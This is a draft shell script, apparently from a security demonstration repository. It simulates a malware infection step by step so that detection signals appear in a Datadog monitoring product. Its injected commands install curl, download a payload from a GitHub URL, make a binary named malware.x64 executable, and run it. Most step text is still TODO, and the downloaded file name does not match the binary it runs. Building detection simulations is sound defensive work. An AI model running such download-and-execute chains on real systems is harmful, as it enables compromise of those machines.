#!/usr/bin/sh

# Source the helper functions
. "$(dirname "$0")/../../scripts/tool.sh"

# Parse command line arguments
parse_args "$@"

print <<EOF
\033[1;37m# Educational Security Simulation\033[0m

\033[1;33m⚠️  WARNING: This is a SIMULATION for demonstration purposes only! ⚠️\033[0m

${PURPLE}TODO\033[0m

\033[1;33mThe malware used in this simulation is FAKE and HARMLESS.\033[0m
EOF




step <<EOF
\033[1;35mTool installation - Install a network utility\033[0m

${PURPLE} TODO \033[0m
EOF
wait_for_confirmation
inject "apt update && apt install -y curl"





step <<EOF
\033[1;35mFirst stage download\033[0m

${PURPLE} TODO \033[0m
EOF
wait_for_confirmation
## TODO: replace with main before merge
inject "curl -O https://github.com/DataDog/datadog-security-playground/blob/eb7951676165f26867a71fa5900d71f2b72872ae/assets/malware/payload.sh"




step <<EOF
${PURPLE} TODO \033[0m
EOF
wait_for_confirmation
inject "chmod +x malware.x64"




step <<EOF
${PURPLE} TOTO \033[0m
EOF
wait_for_confirmation
inject "/app/malware.x64 --cpu-priority 44"



print <<EOF
${GREEN}Demostration simulation completed successfully!\033[0m

${YELLOW}You can now view the signals in the DataDog Workload Protection App.\033[0m
EOF
